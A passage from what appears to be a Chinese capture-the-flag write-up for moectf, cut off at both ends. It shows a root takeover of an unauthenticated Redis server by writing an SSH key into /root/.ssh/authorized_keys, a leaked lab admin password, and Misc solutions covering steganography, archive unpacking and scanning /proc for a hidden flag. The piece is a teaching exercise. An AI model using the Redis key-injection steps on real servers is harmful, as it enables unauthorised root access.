&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;|          oo=.o..|
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;|         + B =.=o|
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;|      . + O =++E+|
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;|     . .S+ *=.+.+|
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;|      . .....+ o*|
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;|       .  .   ..B|
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;|               o.|
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;|                 |
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;+----[SHA256]-----+
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;然后将登录凭证写入到一个文本中，并作为 ssh_key 参数的值存进去，&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;$ (echo -e &amp;quot;\n\n&amp;quot;; cat ~&#x2F;.ssh&#x2F;id_rsa.pub; echo -e &amp;quot;\n\n&amp;quot;) &amp;gt; spaced_key.txt
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;$ cat spaced_key.txt | redis-cli -h 20.2.216.21 -p 6379 -x set ssh_key
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;OK
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;通过 redis-cli 连接修改 SSH 如下所示，&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;$ redis-cli -h &amp;lt;nsp服务端 IP&amp;gt; -p 6379
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;nsp服务端 IP:6379&amp;gt; config set dir &#x2F;root&#x2F;.ssh&#x2F;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;OK
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;nsp服务端 IP:6379&amp;gt; config set dbfilename &amp;quot;authorized_keys&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;OK
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;nsp服务端 IP:6379&amp;gt; save
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;OK
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;nsp服务端 IP:6379&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;最后用 ssh 连进去获得 flag 即可，如下所示。&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;$ ssh -i ~&#x2F;.ssh&#x2F;id_rsa root@&amp;lt;nsp服务端 IP&amp;gt; -p 2222
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Linux e4b99e72207b 5.15.0-71-generic #78-Ubuntu SMP Tue Apr 18 09:00:29 UTC 2023 x86_64
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;The programs included with the Debian GNU&#x2F;Linux system are free software;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;the exact distribution terms for each program are described in the
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;individual files in &#x2F;usr&#x2F;share&#x2F;doc&#x2F;*&#x2F;copyright.
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Debian GNU&#x2F;Linux comes with ABSOLUTELY NO WARRANTY, to the extent
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;permitted by applicable law.
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Last login: Wed Aug 30 08:09:50 2023 from 172.20.0.4
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;root@e4b99e72207b:~# ls
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;root@e4b99e72207b:~# cd &#x2F;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;root@e4b99e72207b:&#x2F;# ls
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;bin   data  etc   home  lib32  libx32  mnt  proc  run   srv       sys  usr
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;boot  dev   flag  lib   lib64  media   opt  root  sbin  start.sh  tmp  var
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;root@e4b99e72207b:&#x2F;# cat flag
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Congratulations!!!
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;You beat this moeworld~
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;You need to protect your redis, even if it&amp;#39;s on the intranet.
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;This is the third part of the flag
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;P@sSW0Rd-F0r-redis-Is-NeceSsary}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h4 id=&quot;0x06-jie-guo-qi-ta&quot;&gt;0x06 结果 &amp;amp; 其他&lt;a class=&quot;zola-anchor&quot; href=&quot;#0x06-jie-guo-qi-ta&quot; aria-label=&quot;Anchor link for: 0x06-jie-guo-qi-ta&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h4&gt;
&lt;p&gt;将三段 flag 拼起来就可以得到完整的 flag 如下&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;moectf{Information-leakage-Is-dangerous!-Are-YOu-myS0L-MasT3r?-P@sSW0Rd-F0r-redis-Is-NeceSsary}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;通过查看数据库中的 &lt;code&gt;users&lt;&#x2F;code&gt; 表可以看到 &lt;code&gt;admin&lt;&#x2F;code&gt; 的密码为 &lt;code&gt;SecurityP@sSw0Rd&lt;&#x2F;code&gt; 。&lt;&#x2F;p&gt;
&lt;h2 id=&quot;misc&quot;&gt;Misc&lt;a class=&quot;zola-anchor&quot; href=&quot;#misc&quot; aria-label=&quot;Anchor link for: misc&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h2&gt;
&lt;h3 id=&quot;ru-men-zhi-bei-1&quot;&gt;入门指北&lt;a class=&quot;zola-anchor&quot; href=&quot;#ru-men-zhi-bei-1&quot; aria-label=&quot;Anchor link for: ru-men-zhi-bei-1&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;base64 解码就可以得到 flag。&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;moectf{h@v3_fun_@t_m15c_!}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;gou-zi-1-pu-tong-de-mao&quot;&gt;狗子(1) 普通的猫&lt;a class=&quot;zola-anchor&quot; href=&quot;#gou-zi-1-pu-tong-de-mao&quot; aria-label=&quot;Anchor link for: gou-zi-1-pu-tong-de-mao&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;用 010 打开 flag 就在末尾。&lt;&#x2F;p&gt;
&lt;p&gt;moectf{eeeez_f1ag_as_A_G1ft!}&lt;&#x2F;p&gt;
&lt;h3 id=&quot;gou-zi-2-zhao-pian&quot;&gt;狗子(2) 照片&lt;a class=&quot;zola-anchor&quot; href=&quot;#gou-zi-2-zhao-pian&quot; aria-label=&quot;Anchor link for: gou-zi-2-zhao-pian&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;需要增加下 ruby 的堆栈大小限制&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;$ export RUBY_THREAD_VM_STACK_SIZE=500000000
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;$ zsteg bincat_hacked.png
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;b1,bgr,lsb,xy       .. &amp;lt;wbStego size=132, data=&amp;quot;|\xB4\xCBmR\x83m\xB1]\x18&amp;quot;..., even=false, enc=&amp;quot;wbStego 2.x&#x2F;3.x&amp;quot;, mix=true, controlbyte=&amp;quot;\xCF&amp;quot;&amp;gt;                         
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;b1,rgba,lsb,xy      .. text: &amp;quot;moectf{D0ggy_H1dd3n_1n_Pho7o_With_LSB!}\n&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;b2,a,msb,xy         .. file: VISX image file
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;b2,rgb,lsb,xy       .. text: &amp;quot;{R3s0.\tL&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;b2,rgba,msb,xy      .. text: &amp;quot;qFDTAQTDl&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;b2,abgr,msb,xy      .. text: &amp;quot;=3iO{%y9&#x2F;&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;b3,r,msb,xy         .. text: &amp;quot;$&amp;amp;]K%Hb$E&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;b4,r,lsb,xy         .. text: &amp;quot;eDwd\&amp;quot;GeS&amp;#39;&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;b4,g,lsb,xy         .. text: &amp;quot;eDwdDieS&amp;#39;&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;b4,b,lsb,xy         .. text: &amp;quot;dEBFUWuS&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;b4,rgb,lsb,xy       .. text: &amp;quot;2#5DgeU#&amp;#39;vgj&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;b4,bgr,lsb,xy       .. text: &amp;quot;43$EgeU#&amp;amp;wgk&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;b4,rgba,lsb,xy      .. text: &amp;quot;gnD_D_#&amp;gt;&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;b4,rgba,msb,xy      .. text: &amp;quot;~{sssQu5s5ubvbr&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;b4,abgr,msb,xy      .. text: &amp;quot;7SWSg&amp;amp;&amp;#39;&amp;amp;&amp;quot;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;gou-zi-3-qin-shi&quot;&gt;狗子(3) 寝室&lt;a class=&quot;zola-anchor&quot; href=&quot;#gou-zi-3-qin-shi&quot; aria-label=&quot;Anchor link for: gou-zi-3-qin-shi&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;import os
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;import subprocess
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;import tarfile
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;import zipfile
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;import rarfile
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;EXTRACT_DIR = &amp;quot;.&#x2F;unpacked&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;if not os.path.exists(EXTRACT_DIR):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    os.makedirs(EXTRACT_DIR)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;def extract_7z(filepath, extract_to):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    command = [&amp;quot;E:\\NetworkSecurity\\7-Zip\\7z.exe&amp;quot;, &amp;quot;x&amp;quot;, filepath, f&amp;quot;-o{extract_to}&amp;quot;]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    subprocess.run(command, check=True)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;def extract_file(filepath, extract_to):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    if filepath.endswith(&amp;#39;.tar&amp;#39;):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        with tarfile.open(filepath, &amp;#39;r&amp;#39;) as archive:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            archive.extractall(extract_to)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    elif filepath.endswith(&amp;#39;.zip&amp;#39;):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        with zipfile.ZipFile(filepath, &amp;#39;r&amp;#39;) as archive:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            archive.extractall(extract_to)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    elif filepath.endswith(&amp;#39;.rar&amp;#39;):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        with rarfile.RarFile(filepath, &amp;#39;r&amp;#39;) as archive:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            archive.extractall(extract_to)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    elif filepath.endswith(&amp;#39;.gz&amp;#39;) or filepath.endswith(&amp;#39;.tgz&amp;#39;):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        with tarfile.open(filepath, &amp;#39;r:gz&amp;#39;) as archive:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            archive.extractall(extract_to)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    elif filepath.endswith(&amp;#39;.bz2&amp;#39;):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        with tarfile.open(filepath, &amp;#39;r:bz2&amp;#39;) as archive:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            archive.extractall(extract_to)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    elif filepath.endswith(&amp;#39;.7z&amp;#39;):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        extract_7z(filepath, extract_to)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    else:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        raise ValueError(f&amp;quot;Unknown archive format: {filepath}&amp;quot;)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;def unpack_archive(starting_archive):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    queue = [starting_archive]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    while queue:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        current_path = queue.pop()
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        try:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            extract_file(current_path, EXTRACT_DIR)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            os.remove(current_path)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        except ValueError:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            return current_path
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        for root, _, files in os.walk(EXTRACT_DIR):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            for file in files:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;                queue.append(os.path.join(root, file))
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    return None
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;flag_file = unpack_archive(&amp;quot;ziploop.tar&amp;quot;)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;# moectf{Ca7_s133p1ng_und3r_zip_5hell5}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;gou-zi-4-gu-xiang-hua&quot;&gt;狗子(4) 故乡话&lt;a class=&quot;zola-anchor&quot; href=&quot;#gou-zi-4-gu-xiang-hua&quot; aria-label=&quot;Anchor link for: gou-zi-4-gu-xiang-hua&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;转 0 和 1 可以得到以下内容。&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0 1 1 1 1 0 0 0 1 1 0 0 0 0 1 0 1 0 0 0 1 1 0 0 0 0 0 1 0 0 0 0 1 0 1 0 0 0 1 0 0 0 0 0 0 0 0 0 0 1 0 1 0 0 0 0 0 0 0 
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0 0 0 0 0 0 0 0 0 0 1 0 0 0 1 0 1 0 0 0 0 1 0 0 0 0 1 0 1 0 0 0 1 0 1 0 0 0 1 0 0 0 0 0 1 0 0 0 0 1 0 0 0 0 0 1 0 1 0 
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0 1 1 0 0 0 0 0 0 0 1 0 0 0 0 0 1 0 0 0 0 1 0 0 0 0 1 0 1 0 0 0 0 0 1 0 0 0 0 1 0 0 0 0 0 0 0 0 0 1 0 0 0 0 0 0 0 0 0 
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0 0 0 1 1 0 0 0 0 1 0 0 0 0 0 1 0 0 0 0 0 0 0 0 0 0 1 0 0 0 0 0 0 1 0 0 0 0 0 1 0 0 0 1 0 1 0 0 0 1 0 0 0 0 0 1 0 1 0 
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0 0 0 0 0 0 0 0 1 0 0 0 0 0 1 0 0 0 0 0 0 1 0 0 0 1 1 0 0 0 0 0 1 0 0 0 0 0 0 1 0 0 0 0 0 0 0 0 0 1 1 1 0 0 0 0 0 0 0 
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;可以看出这里面的 &lt;code&gt;1&lt;&#x2F;code&gt; 组成了一个特殊的字符，通过 https:&#x2F;&#x2F;www.dcode.fr&#x2F;standard-galactic-alphabet 翻译可以得到以下内容&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;writeup.owo.show&#x2F;~gitbook&#x2F;image?url=https%3A%2F%2F1538376902-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FP93uXUpqRmANvc0oiUrO%252Fuploads%252FYLkTrwNjN9WvMLSx7Rnf%252F%25E7%258B%2597%25E5%25AD%2590%283%29%2520%25E5%25AF%259D%25E5%25AE%25A4-1.jpg%3Falt%3Dmedia%26token%3Dcf8053c4-0495-4c62-a057-b2a321506c6d&amp;amp;width=768&amp;amp;dpr=4&amp;amp;quality=100&amp;amp;sign=4858f268e009fa5cc4b4fb83ea2a26d2bbc071f7400717284590bc8a17b768ae&quot; alt=&quot;img&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;moectf{dontanswer}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;gou-zi-5-mao-xian-qiu&quot;&gt;狗子(5) 毛线球&lt;a class=&quot;zola-anchor&quot; href=&quot;#gou-zi-5-mao-xian-qiu&quot; aria-label=&quot;Anchor link for: gou-zi-5-mao-xian-qiu&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;$ nc localhost 37285
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Welcome to your cat shell. Start your tracing by executing `cat doggy.py`!
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(yourcat) cat doggy.py
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;通过 &lt;code&gt;cat doggy.py&lt;&#x2F;code&gt; 可以得到 &lt;code&gt;doggy.py&lt;&#x2F;code&gt; 的源码如下&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;from time import sleep
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;from os import environ, system, popen
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;from random import randint
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;from sys import argv
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;# Note: Flag is initially in argv[1], but Doggy does the following process to hide it:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;# The cat spawns many processes so you won&amp;#39;t find him!
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;for _ in range(randint(100, 1000)):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    system(&amp;quot;true&amp;quot;)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;if argv[1] != &amp;quot;flag{HIDDEN}&amp;quot;:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    # The cat spawns himself again to hide the flag (and spawn lots of process again in order not to be found easily)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    environ[&amp;quot;CATSFLAG&amp;quot;] = argv[1]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    popen(f&amp;quot;python {__file__} flag{{HIDDEN}}&amp;quot;)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;else:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    # After securely hiding himself, he sleeps before escaping to his universe...
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    # Note that Doggy starts hiding exactly when the environment starts.
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    # So if Doggy escapes in 5 mins, you will HAVE TO RESET your environment!
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    # (i.e. run `service stop` and `service start` on the platform)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    sleep(300)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    exit()
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;代码简要意思就是，flag 会被藏在 &lt;code&gt;python ... doggy.py&lt;&#x2F;code&gt; 的进程中，可以通过 &lt;code&gt;cat &#x2F;proc&#x2F;&amp;lt;pid&amp;gt;&#x2F;environ&lt;&#x2F;code&gt; 来获取 flag，并且这个进程会持续 5 分钟，超过五分钟进程消失后 flag 也跟着不见力。&lt;&#x2F;p&gt;
&lt;p&gt;由于能使用 &lt;code&gt;cat&lt;&#x2F;code&gt; ，上述脚本内容跟进程有关，那就扫一下进程吧。&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;from pwn import *
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;r = remote(&amp;#39;127.0.0.1&amp;#39;, 38617)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;print(r.recvline())
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;for pid in range(1, 10000):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    time.sleep(0.05)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    r.sendline(f&amp;#39;cat &#x2F;proc&#x2F;{pid}&#x2F;cmdline&amp;#39;.encode())
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    response = r.recvline()
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    if b&amp;#39;Error: could not open file&amp;#39; not in response:
